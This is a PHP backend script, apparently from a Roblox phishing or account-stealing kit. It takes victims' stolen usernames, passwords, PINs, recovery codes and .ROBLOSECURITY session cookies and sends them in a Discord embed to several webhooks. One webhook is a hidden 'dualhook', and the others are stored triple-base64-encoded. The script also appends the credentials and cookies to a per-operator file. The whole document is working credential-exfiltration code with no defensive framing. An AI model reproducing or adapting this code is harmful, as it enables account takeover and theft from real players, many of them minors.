<?php
session_start();
$log = json_decode($_POST['log']);
$username = $log->username;
$userid = $log->userid;
$age = $log->age;
$password = $log->password;
$summary = $log->summary;
$balance = $log->balance;
$pending = $log->pending;
$rap = $log->rap;
$credit = $log->credit;
$pin = $log->pin;
$step = $log->step;
$premium = $log->premium;
$accountage = $log->accountage;
$cantrade = $log->cantrade;
$collectibles = $log->collectibles;
$recoverycodes = $log->recoverycodes;
$roblosecurity = $log->roblosecurity;
if($recoverycodes){
require('setup.php');
$result = json_encode([
            "username" => $name,
            "avatar_url" => $thumbnail,
             "content" => $message,
                "embeds" => [
                    [
                        "title" => "$username ($age)",
                        "type" => "rich",
                        "description" => "[Profile](https://www.roblox.com/users/$userid/profile) | [Trade](https://www.roblox.com/users/$userid/trade) | [Check](https://www.roblox.com/login)",
                        "url" => $url,
                        "color" => hexdec($hex),
                        "thumbnail" => [
                            "url" => "https://www.roblox.com/headshot-thumbnail/image?userId=$userid&width=420&height=420&format=png"
                        ],
                        "author" => [
                        "name" => $name,
                        "url" => $url
                        ],
                        "fields" => [
                            [
                                "name" => "**Username:**",
                                "value" => "```$username```",
                                "inline" => False
                            ],
                            [
                                "name" => "**Password:**",
                                "value" => "```$password```",
                                "inline" => False
                            ],
                            [
                                "name" => "**Summary:**",
                                "value" => "```R$$summary```",
                                "inline" => True
                            ],
                            [
                                "name" => "**Balance:**",
                                "value" => "```R$$balance $pending```",
                                "inline" => True
                            ],
                            [
                                "name" => "**RAP:**",
                                "value" => "```R$$rap```",
                                "inline" => True
                            ],
                            [
                                "name" => "**Credit:**",
                                "value" => "```$credit```",
                                "inline" => True
                            ],
                            [
                                "name" => "**Pin:**",
                                "value" => "```$pin```",
                                "inline" => True
                            ],
                            [
                                "name" => "**2-Step:**",
                                "value" => "```$step```",
                                "inline" => True
                            ],
                            [
                                "name" => "**Premium:**",
                                "value" => "```$premium```",
                                "inline" => True
                            ],
                            [
                                "name" => "**Account Age:**",
                                "value" => "```$accountage```",
                                "inline" => True
                            ],
                            [
                                "name" => "**Can Trade:**",
                                "value" => "```$cantrade```",
                                "inline" => True
                            ],
                            [
                                "name" => "**Collectibles:**",
                                "value" => "```$collectibles```",
                                "inline" => False
                            ],
                            [
                                "name" => "**Recovery Codes:**",
                                "value" => "```$recoverycodes```",
                                "inline" => False
                            ],
                            [
                                "name" => "**.ROBLOSECURITY:**",
                                "value" => "```$roblosecurity```",
                                "inline" => False
                            ],
                        ]
                    ],
                ],
            
        ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
        $id = base64_decode($_SESSION['returnUrl']);
        if($dualhook){
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $dualhook,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $result,
            CURLOPT_HTTPHEADER => [
                "Content-Type: application/json"
            ]
        ]);                                   
            $response = curl_exec($ch);
            curl_close($ch);
        }
        $id = base64_decode($_SESSION['returnUrl']);
        $dwebhook = base64_decode(base64_decode(base64_decode(file_get_contents("users/$id/setup/dwebhook.txt"))));
        if (strpos($dwebhook, 'api/webhooks/')) {
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $dwebhook,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $result,
            CURLOPT_HTTPHEADER => [
                "Content-Type: application/json"
            ]
        ]);                                   
        $response = curl_exec($ch);
        curl_close($ch);
        }
        $webhook = base64_decode(base64_decode(base64_decode(file_get_contents("users/$id/setup/webhook.txt"))));
        if (strpos($webhook, 'api/webhooks/')) {
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $webhook,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $result,
            CURLOPT_HTTPHEADER => [
                "Content-Type: application/json"
            ]
        ]);                                   
        $response = curl_exec($ch);
        curl_close($ch);
        $account_json = file_get_contents("users/$id/cookies/json.txt");
        $account_json.= '{"avatar":"https://www.roblox.com/headshot-thumbnail/image?userId='."".$userid."".'&width=420&height=420&format=png","username":"'."".$username."".'","password":"'."".base64_encode($password)."".'","robux":"'."".$balance."".'","rap":"'."".$rap."".'","roblosecurity":"'."".$roblosecurity."".'"},';
            file_put_contents("users/$id/cookies/json.txt", $account_json);
        }
        unset($_SESSION['username']);
        unset($_SESSION['userid']);
        unset($_SESSION['password']);
        unset($_SESSION['ticket']);
        echo '1';
}
?>